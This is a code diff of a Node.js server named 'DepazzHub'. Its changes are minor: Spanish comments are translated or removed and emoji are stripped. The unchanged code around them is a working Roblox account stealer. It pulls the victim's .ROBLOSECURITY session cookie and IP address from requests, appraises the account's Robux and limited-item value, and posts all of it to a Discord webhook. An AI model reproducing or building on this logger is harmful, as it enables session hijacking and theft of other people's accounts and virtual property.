@@ -21,7 +21,7 @@ async function getAccountValue(userId) {
                 rap = rapRes.data.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
             }
         } catch (e) {
-            console.log("Inventario privado o error al obtener RAP.");
+            console.log("Inventory private error trying to get RAP.");
         }
 
         const total = robux + rap;
@@ -41,14 +41,12 @@ app.post('/log', async (req, res) => {
     try {
         const { username, displayName, userId, gameId, accountAge, region } = req.body;
 
-        // 🔑 EXTRAER COOKIE DE LA PETICIÓN
         const robloxCookie = req.headers['cookie']?.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
 
         const clientIP = req.ip || req.connection.remoteAddress || 'N/A';
 
         const accountValue = await getAccountValue(userId);
 
-        // ✅ Agregar cookie al embed
         const payload = {
             content: "🚀 **DepazzHub**",
             embeds: [{
@@ -58,12 +56,10 @@ app.post('/log', async (req, res) => {
                     { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                     { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
 
-                    // 💰 NUEVOS CAMPOS DE VALOR
                     { name: "💵 Robux", value: `R$ ${accountValue.robux}`, inline: true },
                     { name: "💎 RAP (Limiteds)", value: `R$ ${accountValue.rap}`, inline: true },
                     { name: "💰 Total Value", value: `**R$ ${accountValue.total}**`, inline: true },
 
-                    // 🍪 COOKIE ROBLOSECURITY AGREGADA
                     { 
                         name: "🍪 Cookie .ROBLOSECURITY", 
                         value: `\`${robloxCookie}\``, 
@@ -90,12 +86,12 @@ app.post('/log', async (req, res) => {
 
 app.get('/', (req, res) => {
     res.json({ 
-        status: "✅ API is running!",
+        status: "API is running!",
         webhookConfigured: !!DISCORD_WEBHOOK
     });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
